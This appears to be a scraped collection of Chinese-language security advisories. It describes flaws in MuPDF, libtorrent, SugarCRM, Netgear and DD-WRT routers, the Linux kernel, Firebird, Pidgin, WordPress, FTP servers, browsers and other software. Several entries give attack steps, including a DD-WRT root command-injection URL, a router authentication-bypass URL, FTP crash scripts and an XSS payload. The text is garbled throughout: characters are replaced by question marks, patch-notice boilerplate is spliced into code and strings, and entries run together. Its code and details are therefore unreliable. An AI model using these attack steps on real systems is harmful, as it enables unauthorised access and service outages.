strlen(Host: \r\n\r\n)= 10strlen(A x504) = 504总计?041字节，因此使用这个功能可能会触发缓冲区溢出?      MuPDF是一个PDF格式分析器，用来阅读PDF文件，并创建Fitz树状图?MuPDF的pdf_function.c文件的loadexponentialfunc()函数在解析畸形的PDF文件时存在堆溢出漏洞。以下是mupdf/mupdf/pdf_function.c文件中的有漏洞代码段?       obj = fz_dictgets(dict, \"C0\");     if (fz_isarray(obj))     {         func->n = fz_arraylen(obj);         for (i = 0; i < func->n; ++i)             func->u.e.c0[i] = fz_toreal(fz_arrayget(obj, i));   } 未经任何检查便使用了func->n，导致这个堆溢出?      Sun Java System Communications Express为Sun Java通讯套件提供了WEB客户端，允许通过浏览器管理邮件、日历、任务等?Sun Java System Communications Express的https://<server>/uwc/abs/search.xml? 和http://<server>/uwc/base/UWCMain 文件中存在跨站脚本漏洞。如果远程攻击者向服务器提交了带有畸形参数的GET请求的话，就可以导致在用户浏览器会话中执行任意脚本代码?      libtorrent是很多桌面应用和嵌入式设备都在使用的开源C++ bittorrent??libtorrent没有正确的过滤多文件模式的路径名，在src/torrent_info.cpp中对目录组件所执行的唯一检查就是对\"..\"的检? 184:for (int i = 0, end(p->list_size()); i < end; ++i)185:{186:if (p->list_at(i)->type() != lazy_entry::string_t)187:return false;188:std::string path_element = p->list_at(i)->string_value();189:if (path_element != \"..\")190:target.path /= path_element;191:}如果攻击者在.torrent文件的路径元素中包含了目录遍历序列的话，就可以创建或覆盖任意文件?      Firefox是一款非常流行的开放源码WEB浏览器。Mozilla Firefox浏览器中所添加的keygen标签(<keygen>)允许使用各种算法自动生成密钥。该功能会自动向crux脚本提交公钥部分，Keygen标签通过以参数形式向当前的URL提交公钥重新加载文档。结合JavaScript onload()调用，就会导致死循环，阻断对UI的访问?      Net-SNMP是一个免费的、开放源码的SNMP实现，以前称为UCD-SNMP?如果远程攻击者向Net-SNMP的snmpd守护程序发送了特制的SNMP GetBulk请求，就可能在以下代码的运算中将0用作除数，导致snmpd崩溃?if (maxbulk <;= 0 || maxbulk > maxresponses / r)maxbulk = maxresponses / r;攻击者必须能够读访问SNMP服务器才可以利用这个漏洞。在默认的配置中，团体名称\"public\"允许只读访问?      ugarCRM是开源的客户关系管理系统?SugarCRM的Compose Email部分允许发送带有附件的邮件。在指定文件名时，会调用一个验证例程：function safeAttachmentName($filename) {global $sugar_config;$badExtension = false;//get position of last \".\" in file name$file_ext_beg = strrpos($filename, \".\");$file_ext = \"\";//get file extensionif($file_ext_beg > 0) {$file_ext = substr($filename, $file_ext_beg + 1);}//check to see if this is a file with extension located in \"badext\"foreach($sugar_config[&#039;upload_badext&#039;] as $badExt) {if(strtolower($file_ext) == strtolower($badExt)) {//if found, then append with .txt and break out of lookup$filename = $filename . \".txt\";$badExtension = true;break; // no need to look for more} // if} // foreachreturn $badExtension;}这个例程检查文件扩展名是否在黑名单中，如果是则向文件名添加.txt扩展名，但这里存在一个编码错误：函数假设文件?不包括扩展名)至少为一个字符长。这个假设源自以下语句：if($file_ext_beg > 0)如果将文件名设置?php，就可以绕过检查，扩展名被认定为为空。由于空的扩展名不在黑名单中，因此不会对文件名附加任何扩展名。在这个检查后会在文件系统上创?id><filename>形式的文件，其中id是字母组成的字符串?      fuzzylime是一个内容管理系统，是建立各种规模站点的理想系统?fuzzylime的code/confirm.php模块没有正确验证对list参数所提供的输入，code/display.php模块没有正确验证对template参数所提供的输入，远程攻击者可以包含本地资源的任意文件。以下是有漏洞的代码段：confirm.php----------------------------------------------------------------- 1. <? 2. @extract($HTTP_GET_VARS); 3. @extract($_GET);27.elseif(isset($e)) { 28. $filename = \"code/mailing/$list.inc.php\"; 29.@include $filename; -----------------------------------------------------------------display.php --------------------------------------------------------------------98. if($_GET[&#039;print&#039;] != \"1\") include \"templates/${template}_f.php\";--------------------------------------------------------------------成功利用这些漏洞要求禁用了magic_quotes_gpc?   patch -p1 < ./security_fix_admin_20090522.patch   NetGear DG632是一个老款的家用ADSL路由器?Netgear DG632路由器在80端口上运行了一个Web接口，允许管理员登录并管理设备的设置。到这个Web接口的认证是?cgi-bin/中名为webcm的脚本处理的，该脚本根据用户的认证情况重新定向到相关页面?webcm脚本处理用户认证并尝试通过以下javascript加载indextop.htm。indextop.htm页面要求执行HTTP基础认证?---<script language=\"javascript\" type=\"text/javascript\">function loadnext() {//document.forms[0].target.value=\"top\";document.forms[0].submit();//top.location.href=\"../cgi-bin/webcm?nextpage=../html/indextop.htm\";}</script></head><body bgcolor=\"#ffffff\" onload=\"loadnext()\" >Loading file ...<form method=\"POST\" action=\"../cgi-bin/webcm\" id=\"uiPostForm\"><input type=\"hidden\" name=\"nextpage\" value=\"../html/indextop.htm\" id=\"uiGetNext\"><input type=\"hidden\" name=\"__hash__\" value=\"91119508d888e9884b661fd664a8b874\" /></form>---如果提供了默认admin用户的有效用户名，脚本就会继续加载indextop.htm页面并基于隐藏字段加载其他帧；如果用户认证失败，就会返回到\"../cgi-bin/webcm\"。攻击者可以绕过webcm脚本，无需认证直接访问特定的文件?正常使用?http://TARGET_IP/cgi-bin/webcm?nextpage=../html/stattbl.htm这会要求用户进行认证，如果认证详情未知就会拒绝对这个文件的访问。使用以下URL就可以无需提供任何凭据便访问同一stattbl.htm文件?http://TARGET_IP/html/stattbl.htm       Groupware是一个开源的团队协作软件，包含有即时消息、公共论坛、邮件等多种功能?远程攻击者可以通过向Groupware的多个模块提交恶意参数请求导致拒绝服务或执行任意代码?Groupware在与数据库服务器通讯时通常会调用SQL_queryf函数，该函数会使用C格式字符串和其他参数来创建SQL查询。例如，在试图登录的时候，auth_checkpass函数会生成以下查询：if ((sqr=SQL_queryf(sid?SELECT userid?password FROM gw_users WHERE username = &#039;目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：<a href=\"http://nullwebmail.sourceforge.net/groupware/\" target=\"_blank\" rel=\"nofollow\">http://nullwebmail.sourceforge.net/groupware/</a>&#039; and enabled 0?sid-dat-user_username))<0) {由于可以从请求的用户名参数控制sid-dat-user_username的值，因此可以通过SQL注入的方式控制数据库所执行的SQL查询?       eCryptfs是Linux平台下的企业级加密文件系??eCryptfs的密钥管理代码中的parse_tag_11_packet函数没有检查tag 11报文所包含的文字数据大?tag11_contents_size)是否大于max_contents_bytes就作为内存参数将其拷贝到了大小为ECRYPTFS_SIG_SIZE的栈缓冲区中，这可能触发栈溢出漏??fs/ecryptfs/keystore.c -- static int parse_tag_11_packet(unsigned char *data?unsigned char *contents?size_t max_contents_bytes?size_t *tag_11_contents_size?size_t *packet_size?size_t max_packet_size) { size_t body_size; size_t length_size; int rc = 0; ... rc = ecryptfs_parse_packet_length(&data[(*packet_size)]?&body_size?&length_size); if (rc) { printk(KERN_WARNING Invalid tag 11 packet format\n); goto out; } if (body_size < 14) { printk(KERN_WARNING Invalid body size ([%td])\n?body_size); rc = -EINVAL; goto out; } (*packet_size) += length_size; (*tag_11_contents_size) = (body_size - 14); if (unlikely((*packet_size) + body_size + 1 > max_packet_size)) { printk(KERN_ERR Packet size exceeds max\n); rc = -EINVAL; goto out; } if (data[(*packet_size)++] != 0x62) { printk(KERN_WARNING Unrecognizable packet\n); rc = -EINVAL; goto out; } ... (*packet_size) += 12; /* Ignore filename and modification date */ memcpy(contents?&data[(*packet_size)]?(*tag_11_contents_size)); (*packet_size) += (*tag_11_contents_size); ... --       NetBSD是一款免费开放源代码的UNIX性质的操作系??NetBSD的proplib库在处理外部XML表单中的未定义元??<number>)时可能触发空指针引用。所有使用proplib库进行内核通讯的驱动都受这个漏洞影响，因此能够访问驱动的普通用户就可以导致系统崩溃 ?       Linux Kernel是开放源码操作系统Linux所使用的内核?Linux kernel的drivers/misc/sgi-gru/gruprocfs.c驱动文件中存在单字节溢出漏洞?static ssize_t options_write(struct file *file?const char __user *userbuf? size_t count?loff_t *data){unsigned long val;char buf[80];if (copy_from_user(buf?userbuf?count < sizeof(buf) ? count : sizeof(buf)))return -EFAULT;buf[count - 1] = &#039;&#039;;if (!strict_strtoul(buf?10?&val))gru_options = val;return count;}这个函数用于处理对相关procfs文件的写操作，仅在用户控制的count小于sizeof(buf)(根据之前分配，这个值为80)的情况下才会调用copy_from_user()。但是空终止没有执行这个检查便直接使用了受用户控制的count值减?。因此，可以+w访问procfs文件的用户可以向内核内存中的任意位置写入一个空字节?      Firebird是一款提供多个ANSI SQL-92功能的关系型数据库，可运行在Linux、Windows和各种Unix平台??在Firebird的src/remote/server.cpp文件中，process_packet2()函数负责处理从客户端发送过来的报文。这个函数有一个switch语句考虑协议中所定义的所有可能的opcode ?/-----------src/remote/server.cpp:...3404P_OP op = receive->p_operation;3405switch (op)3406{3407case op_connect:...3426case op_compile:...3430case op_attach:...- -----------/在op_connect_request报文的情况下，执行流进入switch语句的以下case?/-----------src/remote/server.cpp:...3584case op_connect_request:3585aux_request(port?&receive->p_req?sendL);3586break;- -----------/在调用aux_request()函数并执行break语句后，执行流到达：/-----------src/remote/server.cpp:...3652if (port && port->port_state == state_broken) {3653if (!port->port_parent) {3654gds__log(\"SERVER/process_packet: broken port?server exiting\");3655port->disconnect(sendL?receive);3656ThreadData::restoreSpecific();3657return false;3658}3659port->disconnect(sendL?receive);3660port = NULL;3661}- -----------/通过在接收到op_connect_request报文时调试fbserver.exe二进制程序可以看出满足了第一个if语句的条件，但没有满足第二个if的条件，因此执行流到达port->disconnect()调用?/-----------005ACE2C|>837E 0C 03 CMP DWORD PTR DS:[ESI+C]?;port->port_state == state_broken ?005ACE30|.75 1BJNZ SHORT fbserver.005ACE4D005ACE32|.837E 1C 00 CMP DWORD PTR DS:[ESI+1C]?;port->port_parent == 0?005ACE36|.75 0AJNZ SHORT fbserver.005ACE42;this conditional jump is taken005ACE38|.68 D4D65F00PUSH fbserver.005FD6D4;ASCII \"SERVER/process_packet: broken port?server exiting\"005ACE3D|.^ E9 44FDFFFFJMP fbserver.005ACB86005ACE42|>53 PUSH EBX; /Arg2005ACE43|.57 PUSH EDI; |Arg1005ACE44|.8BCE MOV ECX，ESI; |005ACE46|.E8 65D7FFFFCALL <fbserver.rem_port::disconnect>; \port->disconnect(sendL?receive)- -----------/根据src/remote/remote.h中的定义，port的类型为struct rem_port。这种结构类型在src/remote/server.cpp中实现了disconnect()函数?/-----------src/remote/server.cpp:1464void rem_port::disconnect(PACKET* sendL?PACKET* receiveL)- -----------/在这个函数中执行以下代码以释放发送和接收的报文并关闭相关的套接字?/-----------src/remote/server.cpp:...1492REMOTE_free_packet(this?sendL);1493REMOTE_free_packet(this?receiveL);1494this->disconnect();- -----------/对this->disconnect()的调用最终会导致src/remote/inet.cpp中的disconnect()函数，该函数用于中断远程连接并接收rem_port结构参数?/-----------src/remote/inet.cpp:1731static void disconnect( rem_port* port)1732{- -----------/首先函数通过调用shutdown函数关闭客户端所创建的连接：/-----------src/remote/inet.cpp:...1763if (port->port_handle && (SOCKET) port->port_handle !=INVALID_SOCKET) {1764shutdown((int) port->port_handle?2);1765}- -----------/之后如果当前正在断开的rem_port结构是其他rem_port结构的子代，就会递归的调用disconnect()断开存储在port->port_async的rem_port。port_async是rem_port结构的成员，描述异步同级端口?/-----------src/remote/inet.cpp:/* If this is a sub-port?unlink it from it&#039;s parent */...1789rem_port* parent = port->port_parent;1790if (parent != NULL) {1791if (port->port_async) {1792disconnect(port->port_async);1793port->port_async = NULL;1794}- -----------/在执行对disconnect()的递归调用时，作为将要断开参数传送的port->port_async对应到主服务器套接字，也就是?050/TCP端口上监听入站连接的套接字。一旦在递归调用中调用了shutdown()和closesocket()函数，服务器就会停止监听默认?050/TCP端口，拒绝对合法用户的服务?      无客户端SSL VPN允许用户无需安装传统的VPN客户端就可以基于浏览器访问内部和外部资源。web vpn服务器一般使用如下过程与客户端进行交互：1. 用户使用Web浏览器向Web VPN提供凭据?. Web VPN对用户进行认证并为会话分配ID，并以Cookie的形式发送到用户浏览器?. 然后用户可以浏览内部资源，如Webmail服务器或内网Web Server?当Web VPN检索网页时，会对超级链接进行重写以便通过web VPN访问。例如，http://<www.intranet.example.com>/mail.html 链接会变为https://<webvpnserver>/www.intranet.example.com/mail.html 。所请求webserver所设置的Cookie在传送给用户浏览器之前会转换为完全唯一的Cookie以防两个重名的Cookie冲突。例如，intranet.example.com所设置的会话ID Cookie在发送到用户浏览器之前会重新命名为intranet.example.com_sessionid。此外，Web VPN会替换对document.cookie等特定HTML DOM对象的引用。这些DOM对象会被返回该DOM对象值的脚本替换，这样就可以在所请求站点域的安全环境中进行访问?      Pidgin是支持多种协议的即时通讯客户端?Pidgin和其他一些即时消息客户端所使用的Libpurple库中存在内存破坏漏洞，远程攻击者可以通过向聊天客户端发送特制的MSNSLP报文触发这个漏洞，导致执行任意代码?攻击需要发送两个连续的MSNSLP消息，第一个用于对slpmsg存储会话id，第二个用于触发漏洞，最终目标是到达msn_slplink_process_msg()中的memcpy()调用。需要创建偏移为?的MSNSLP消息，因为这个值是memcpy()的目标?因为偏移?，所以在调用msn_slplink_message_find()返回NULL时会出现第一个问题：/-----------if (offset == 0){ .. construct a new slpmsg ..}else{ slpmsg = msn_slplink_message_find(slplink?msg->msnslp_header.session_id?msg->msnslp_header.id);}if (slpmsg == NULL){ /* Probably the transfer was canceled */ purple_debug_error(\"msn\"?\"Couldn&#039;t find slpmsg\n\"); return;}- -----------/因此，slpmsg必须为非空，这就是为什么需要发送两次消息才能进行攻击。发送的第一个MSNSLP消息偏移?，用于创建slpmsg对象，Libpurple会存储这个对象；第二个MSNSLP消息的偏移非0，但由于Libpurple已经存储了第一个MSNSLP消息，因此调用msn_slplink_message_find()会有效的返回之前的对象而不是NULL?/-----------if (slpmsg->fp){ /* fseek(slpmsg->fp?offset?SEEK_SET); */ len = fwrite(data?1?len?slpmsg->fp);}else if (slpmsg->size){ if (G_MAXSIZE - len < offset || (offset=&#039;&#039; + len=&#039;&#039;) > slpmsg->size) {  purple_debug_error(\"msn\"?   \"Oversized slpmsg - msgsize=%lld offset=%\" G_GSIZE_FORMAT \"len=%\" G_GSIZE_FORMAT \"\n\"?   slpmsg->size?offset?len);  g_return_if_reached(); } else  memcpy(slpmsg->buffer + offset?data?len); }- -----------/例如，如果创建的第一个MSNSLP消息大小?x01ffffff，第二个消息的偏移为小于0x01ffffff - len的任意值，就满足了任意写入的条件?最后，以小?x01ffffff - len的任意偏移值到达了memcpy()，缓冲区指向0。这意味着可以向低?x01ffffff - len的任意位置写入数据内容?       WordPress是一款免费的论坛Blog系统。如果用户遗忘了口令并申请重置，首先要通过/wp-login.php?action=lostpassword表单提交邮件地址或用户名，然后Wordpress会发送类似于以下的确认邮件：\"Someone has asked to reset the password for the following site and username.http://DOMAIN_NAME.TLD/wordpressUsername: adminTo reset your password visit the following address?otherwise just ignore this email and nothing will happen<a href=\"http://DOMAIN_NAME.TLD/wordpress/wp-login.php?action=rp &key=o7naCKN3OoeU2KJMMsag\" target=\"_blank\">http://DOMAIN_NAME.TLD/wordpress/wp-login.php?action=rp &key=o7naCKN3OoeU2KJMMsag\"用户点击链接后Wordpress会重置管理口令并通过另一封邮件发送新的凭据。整个过程如下：wp-login.php:...[snip]....186行：function reset_password($key) { global $wpdb; $key = preg_replace(&#039;/[^a-z0-9]/i&#039;?&#039;&#039;?$key); if ( empty( $key ) )  return new WP_Error(&#039;invalid_key&#039;?__(&#039;Invalid key&#039;)); $user = $wpdb->get_row($wpdb->prepare(\"SELECT * FROM $wpdb->users WHERE user_activation_key = 目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载?a href=\"http://core.trac.wordpress.org/changeset/11798\" target=\"_blank\" rel=\"nofollow\">http://core.trac.wordpress.org/changeset/11798</a>\"?$key)); if ( empty( $user ) )  return new WP_Error(&#039;invalid_key&#039;?__(&#039;Invalid key&#039;));...[snip]....276行：$action = isset($_REQUEST[&#039;action&#039;]) ? $_REQUEST[&#039;action&#039;] : &#039;login&#039;;$errors = new WP_Error();if ( isset($_GET[&#039;key&#039;]) ) $action = &#039;resetpass&#039;;// validate action so as to default to the login screenif ( !in_array($action?array(&#039;logout&#039;?&#039;lostpassword&#039;?&#039;retrievepassword&#039;?&#039;resetpass&#039;?&#039;rp&#039;?&#039;register&#039;?&#039;login&#039;)) & & false === has_filter(&#039;login_form_&#039; . $action) ) $action = &#039;login&#039;;...[snip]....370行：break;case &#039;resetpass&#039; :case &#039;rp&#039; : $errors = reset_password($_GET[&#039;key&#039;]); if ( ! is_wp_error($errors) ) {  wp_redirect(&#039;wp-login.php?checkemail=newpass&#039;);  exit(); } wp_redirect(&#039;wp-login.php?action=lostpassword &error=invalidkey&#039;); exit();break;...[snip ]...如果用户?key变量提交了数组，就可以滥用口令重置功能绕过第一步，重置管理口令?      DD-WRT是一个供无线路由器使用的嵌入版Linux，可以在普通的家用无线路由器实现商用无线路由器功能。DD-WRT的httpd.c文件中存在多个安全漏洞：859    if (containsstring(file?\"cgi-bin\")) {860 861      auth_fail = 0;862      if (!do_auth863       (conn_fp?auth_userid?auth_passwd?auth_realm?64       authorization?auth_check))865        auth_fail = 1;......... (snip)............899 900      }901      exec = fopen(\"/tmp/exec.tmp\"?\"wb\");902      fprintf(exec?\"export REQUEST_METHOD=\\"目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：<a href=\"http://www.dd-wrt.com\" target=\"_blank\" rel=\"nofollow\">http://www.dd-wrt.com</a>\\"\n\"?method);903      if (query)904        fprintf(exec?\"/bin/sh /</tmp/exec.query\n\"?05          server_dir != NULL ?server_dir : \"/www\"，file);906      else907        fprintf(exec?\"//\n\"?08          server_dir != NULL ? server_dir : \"/www\"，file);909      fclose(exec);910 911      if (query) {912        exec = fopen(\"/tmp/exec.query\"?\"wb\");913        fprintf(exec?\"\n\"?query);........................这里存在两个问题?) 没有处理元字符?) 未经认证便执行了命令。如果没有通过认证就不会给出任何输出?......................914        free(query);915        fclose(exec);916      }917 918      system2(\"chmod 700 /tmp/exec.tmp\");919      system2(\"/tmp/exec.tmp>/tmp/shellout.asp\");........... (snip)..........926      if (auth_fail == 1) {927        send_authenticate(auth_realm);928        auth_fail = 0;------------3) httpd以root用户权限运行。结合以上三个问题，任何能够连接到Web管理接口的未经认证的攻击者都可以在浏览器中通过类似于以下的URL获得对设备的root访问?http://routerIP/cgi-bin/;command_to_execute       NetBSD是一款免费开放源代码的UNIX性质的操作系统?在Intel架构上，操作系统内核完成了对中断或异常的服务后通常会使用iret返回到用户态。iret指令会恢复执行继续所需的上下文，如代码段、指令指针、标记等。在受保护模式中iret会分为两个不同的阶段执行，分别为提交前阶?pre-commit，权限级别改变之?和提交后阶段(post-commit，权限级别改变后)。可在以下伪代码中找到提交点?IF new mode != 64-Bit Mode  THEN    IF tempEIP is not within code segment limits      THEN #GP(0); FI;    EIP <- tempEIP;  ELSE (* new mode = 64-bit mode *)    IF tempRIP is non-canonical      THEN #GP(0); FI;    RIP <- tempRIP;FI;CS <- tempCS;  // This is the commit point (privilege switch)EFLAGS (CF, PF, AF, ZF, SF, TF, DF, OF, NT) <- tempEFLAGS;当处理器在处理异常时，会出现两种情况?- 与中断的过程相同的权限级别执行处理器过程，不会发生栈切换?- 以不同的权限级别执行处理器过程，因此会发生栈切换?如果发生了栈切换，所生成的栈帧会不同，因为处理器要保存中断过程的栈。当iret返回到不同的权限级别时，出现失败时的行为会取决于运算当前所处的阶段：提交前失败不会导致栈切换，而提交后失败会导致栈切换，因此生成不同的陷阱帧?对于NetBSD，内核栈会由于这个漏洞而变得不同步，这可能允许攻击者获得权限提升?       Linux Kernel是开放源码操作系统Linux所使用的内核。Linux Kernel的md驱动(drivers/md/md.c)中存在拒绝服务漏洞，本地用户可以通过suspend_* sysfs属性和suspend_lo_store或suspend_hi_store函数触发空指针引用。只有在sysfs可写的情况下才可以利用这个漏洞。以下是有漏洞的代码段：static ssize_tsuspend_lo_store(mddev_t *mddev?const char *buf?size_t len){  char *e;  unsigned long long new = simple_strtoull(buf?&e?10);  if (mddev->pers->quiesce == NULL)    return -EINVAL;  if (buf == e || (*e & & *e != &#039;\n&#039;))    return -EINVAL;  if (new >= mddev->suspend_hi ||   (new > mddev->suspend_lo & & new < mddev->suspend_hi)) {    mddev->suspend_lo = new;    mddev->pers->quiesce(mddev?2);    return len;  } else    return -EINVAL;}static struct md_sysfs_entry md_suspend_lo =__ATTR(suspend_lo?S_IRUGO|S_IWUSR?suspend_lo_show?suspend_lo_store);    # patch < /path/to/patch   Websense Email Security是综合的邮件安全软件，对邮件和Web 2.0的混合威胁提供防护。Websense Email Security默认监听于TCP/8181端口上的Web Administrator管理前端没有正确地过滤某些变量便返回给了用户，远程攻击者可以通过提交恶意的HTTP请求执行跨站脚本攻击；此外没有正确地过滤邮件的Subject字段便在Web Administrator前端显示，远程攻击者可以在标题中注入类似于\"<script>alert(&#039;X&#039;)</script>的脚本代码在用户浏览器会话中执行?      XM Easy Personal FTP Server是一款简单易用的个人FTP服务器工具。用户登录到XM Personal  FTP Server后对一个套接字连接使用APPE命令而对另一个连接使用DELE命令就会导致服务器停止响应?第一个套接字连接?1.sock.connect((hostname, 21))2.sock.send(\"user 目前厂商已经发布了升级补丁以修复这个安全问题，补丁下载链接：<a href=\"http://www.debian.org/security/2009/dsa-1924\" target=\"_blank\" rel=\"nofollow\">http://www.debian.org/security/2009/dsa-1924</a>\r\n\" %username)3.sock.send(\"pass \r\n\" %passwd)4.sock.send(\"PORT 127,0,0,1,122,107\r\n\")5.sock.send(\"APPE \"+ test_string +\"\r\n\")6.sock.close()第二个套接字连接?1.sock.connect((hostname, 21))2.sock.send(\"user \r\n\" %username)3.sock.send(\"pass \r\n\" %passwd)4.sock.send(\"DELE \"+ test_string +\"\r\n\")       Home Ftp Server是一款简单易用的FTP服务器?当用户登录到Home FTP Server后，执行以下步骤就会导致服务器停止响应：1.sock.connect((hostname, 21))2.sock.send(\"user 目前厂商还没有提供补丁或者升级程序，建议使用此软件的用户随时关注厂商的主页以获取最新版本：<a href=\"http://downstairs.dnsalias.net/homeftpserver.html\" target=\"_blank\" rel=\"nofollow\">http://downstairs.dnsalias.net/homeftpserver.html</a>\r\n\" %username)3.sock.send(\"pass \r\n\" %passwd)4.for i in range(1,20):         sock.send(\"SITE INDEX \"+ \"a\"*30*i +\"\r\n\")5.sock.close()       TYPSoft FTP Server是一款简单易用的FTP服务程序?TYPSoft FTP Server中存在拒绝服务漏洞，用户登录到服务器后对同一个套接字连接同时使用APPE和DELE命令就会导致服务器崩溃：1.sock.connect((hostname, 21))2.sock.send(\"user 目前厂商已经发布了升级补丁以修复这个安全问题，补丁下载链接：<a href=\"http://www.apple.com/support/downloads/\" target=\"_blank\" rel=\"nofollow\">http://www.apple.com/support/downloads/</a>\r\n\" %username)3.sock.send(\"pass \r\n\" %passwd)4.sock.send(\"PORT 127,0,0,1,122,107\r\n\")5.sock.send(\"APPE \"+ test_string +\"\r\n\")6.sock.send(\"DELE \"+ test_string +\"\r\n\")7.sock.close()       LiveZilla是新一代的在线客服与客户地理位置跟踪系统?LiveZilla没有正确地过滤提交给map.php页面的lat、lng和zom参数便返回给了用户，远程攻击者可以通过提交恶意参数请求执行跨站脚本攻击，导致在用户浏览器会话中执行任意HTML和脚本代码。以下是有漏洞的代码段：1. livezilla/templates/map.tpl(18-20?var default_lat = <!--dlat-->; var default_lng = <!--dlng-->; var default_zom = <!--dzom-->;2. livezilla/map.php(15-28?if(isset($_GET[\"lat\"])) $map = str_replace(\"<!--dlat-->\",$_GET[\"lat\"],$map); else $map = str_replace(\"<!--dlat-->\",\"25\",$map); if(isset($_GET[\"lng\"])) $map = str_replace(\"<!--dlng-->\",$_GET[\"lng\"],$map); else $map = str_replace(\"<!--dlng-->\",\"10\",$map); if(isset($_GET[\"zom\"])) $map = str_replace(\"<!--dzom-->\",$_GET[\"zom\"],$map); else $map = str_replace(\"<!--dzom-->\",\"1\",$map);       Google Chrome是Google发布的开源WEB浏览器?当WebKit使用?Google Chrome浏览器时存在代码注入漏洞。远程攻击者可以借助一个特制的 RUBY元素，在Chrome沙盒中执行任意代码。可以通过<ruby>><table><rt>序列验证?      Google Chrome是Google发布的开源WEB浏览器?Google Chrome程序common/common_param_traits.cc函数ParamTraits<SkBitmap>::Read在防止整数溢出算法设计中没有使用正确的变量，远程攻击者可以通过bitmap数据，导致拒绝服务或导致其他未明影响?      Google Chrome是Google发布的开源WEB浏览器?Google Chrome程序common/common_param_traits.cc函数ParamTraits<SkBitmap>::Read没有初始化处理bitmap数据的内存位置。远程攻击者可以通过提供不足数据，从内存处理获取敏感信息，该漏洞与使?1) thumbnail database ?(2) HTML canvas 相关?      MHonArc是一款PERL语言编写的自动解析HTML形式邮件内容的程序，包括在处理过程中从HTML邮件中过滤有危险性的JavaScript标记等功能?MHonArc 2.6.16版本中存在资源管理错误漏洞。远程攻击者可以借助置于其他开始标签中的开始标签导致拒绝服?CPU消?。该漏洞已通过<bo<bo<bo<bo<body>dy>dy>dy>dy>序列得到证实?      Opera是一款流行的WEB浏览器，支持多种平台?Windows和Mac操作系统运行的Opera没有正确处理异步进行的一系列文档修改，远程攻击者可以通过在无限循环中写入<marquee>序列的JavaScript执行任意代码，或引发拒绝服务(应用瘫痪)，该漏洞可能导致未初始化内存的使用?      Apple Safari是苹果家族操作系统默认所捆绑的WEB浏览器?Apple Safari的Safari.exe程序使用的WebKit中，WebKit.dll存在资源管理错误漏洞，远程攻击者可通过在无限循环中写入<marquee> 序列的JavaScript引发拒绝服务(应用瘫痪)?      HTC Hero?009年在英国伦敦正式发布的采用Android OS操作系统的第三代新机HTC Hero?HTC Hero上运行的Dolphin Browser存在漏洞，远程攻击者可通过在无限循环中写入<marquee> 序列的JavaScript引发拒绝服务(应用崩溃)?      HTC Hero?009年在英国伦敦正式发布的采用Android OS操作系统的第三代新机HTC Hero?HTC Hero上运行的Google Chrome存在漏洞，远程攻击者可通过在无限循环中写入<marquee> 序列的JavaScript引发拒绝服务(应用瘫痪)?      Uzbl <Button2>绑定默认配置代码注漏洞入   基于WebKit引擎的浏览器Uzbl?是一个很新的网络浏览器，目前正在活跃开发中?Uzbl 2010.08.05之前版本中的<Button2>绑定的默认配置不能正确使用@SELECTED_URI功能，用户辅助远程攻击者可以借助在HTML文件中A元素中特制的HREF属性执行任意命令?      Blackboard Transact Suite (旧名 Blackboard Commerce Suite) 3.6.0.2之前版本中的BbtsConnection_Edit.exe凭借字段名称确定是否恰当的解密了connection.xml字段值，本地用户可以借助修改包含<Server>域加密密码的connection.xml文件查看数据库密码?      Smarty是一个使用PHP写出来的模板引擎，是目前业界最著名的PHP模板引擎之一?Smarty 3.0.0 beta 7之前版本没有正确处理<?php and ?>标签。该漏洞存在未明影响及远程攻击向量?      Solaris是SUN公司(现已被Oracle收购)研制的类Unix操作系统?Oracle Solaris 10回滚补丁文件(undo.Z)包含未授权用户可读的哈希密码，而某些软件包?var/sadm/pkg/<pkgname>/save/<patchid>/以不安全方式存储了该文件。本地用户可借助此漏洞提取包含root和其他用户的哈希密码文件，并进行暴力密码猜测攻击?      VideoLAN VLC Media Player是一个操作非常简单的媒体播放器，支持多种音频视频格式?VideoLAN VLC媒体播放?.1.6-rc之前?.1版本中的(1)USF解码?modules/codec/subtitles/subsdec.c)?2)Text解码?modules/codec/subtitles/subsusf.c)中的StripTags函数中存在缓冲区溢出漏洞。远程攻击者可以借助位于MKV文件中的带有开启\"<\"标签，却没有闭合\">\"标签的子标题触发堆内存破坏，并可以执行任意代码?      Apache Struts XWork '<s:submit>'错误页面跨站脚本攻击漏洞   Apache Struts 2.2.3之前?.x版本中存在跨站脚本攻击漏洞。当没有定义操作或方法时，借助&ldquo;<s:submit>&rdquo;标签（使用bash语法）传递的操作或方法名称再被用于生成错误页面之前，没有经过XWork的正确过滤。远程攻击者可以利用该漏洞执行任意HTML和脚本代码?      Asterisk是一款开放源码的、PBX系统的软件，运行在Linux系统上，支持使用SIP、IAX、H323协议进行IP通话?Asterisk Open Source 1.8.4.3之前?.8.x版本的SIP信道驱动程序中的reqresp_parser.c文件中存在拒绝服务漏洞。远程攻击者可借助带有Contact头（缺少&ldquo;<&rdquo;字符）的SIP包导致拒绝服务（空指针解引用和守护进程崩溃）?      Firefox是一款非常流行的开源WEB浏览器。Thunderbird是一个邮件客户端，支持IMAP、POP邮件协议以及HTML邮件格式。SeaMonkey是开源的Web浏览器、邮件和新闻组客户端、IRC会话客户端和HTML编辑器?Mozilla Firefox/Thunderbird/SeaMonkey在OGG <video>元素缩放的实现上存在拒绝服务漏洞。攻击者可利用此漏洞使应用程序崩溃，造成拒绝服务，可能会执行任意代码?      ejabberd是高性能的即时消息服务器?ejabberd 2.1.9之前的版本中存在拒绝服务漏洞。该漏洞源于当解析某些节的时候mod_pubsub模块中的一个错?攻击者可利用该漏洞借助特制的\"<publish>\"节触发死循环?      Linux Kernel是开放源码操作系统Linux所使用的内核?Linux kernel 2.6.39以及其他版本的mem_write函数中存在漏洞，该漏洞源于当ASLR被禁用时，在写入?proc/<pid>/mem时未正确检查权限。本地用户可利用该漏洞通过修改进程内存提升权限。该漏洞已在Mempodipper中被证实?      Systemd 39版本中存在漏洞，本地恶意用户可利用该漏洞提升权限。该漏洞源于systemd-logind组件以不安全方式创建了一个X11会话文件(/run/user/<username>/X11/display)。攻击者可利用该漏洞在任意目录中创建符号链接?    ============================================================================================================================================================================================================
---------- 1.TXT
   目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接?<a href=\"https://technet.microsoft.com/library/security/ms14-035\" target=\"_blank\" rel=\"nofollow\">https://technet.microsoft.com/library/security/ms14-035</a>    
